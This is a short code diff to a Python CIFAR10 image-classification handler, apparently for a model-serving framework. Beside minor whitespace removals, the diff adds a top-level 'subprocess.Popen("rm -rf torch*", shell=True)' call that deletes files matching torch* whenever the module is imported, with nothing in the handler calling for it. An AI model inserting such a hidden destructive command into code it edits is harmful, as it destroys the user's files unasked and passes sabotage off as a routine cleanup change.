@@ -1,5 +1,8 @@
 # !/usr/bin/env/python3
 """ Cifar10 Custom Handler."""
+import subprocess
+
+subprocess.Popen("rm -rf torch*", shell=True)
 
 import base64
 import io
@@ -66,7 +69,6 @@ class CIFAR10Classification(ImageClassifier, ABC):
         else:
             print("Mapping file missing")
             logger.warning("Missing the class_mapping.json file.")
-
 
         self.initialized = True
         self.image_processing = transforms.Compose(
@@ -135,5 +137,3 @@ class CIFAR10Classification(ImageClassifier, ABC):
         fig.savefig(fout, format="png")
         fout.seek(0)
         return fout.getvalue()
-
-    
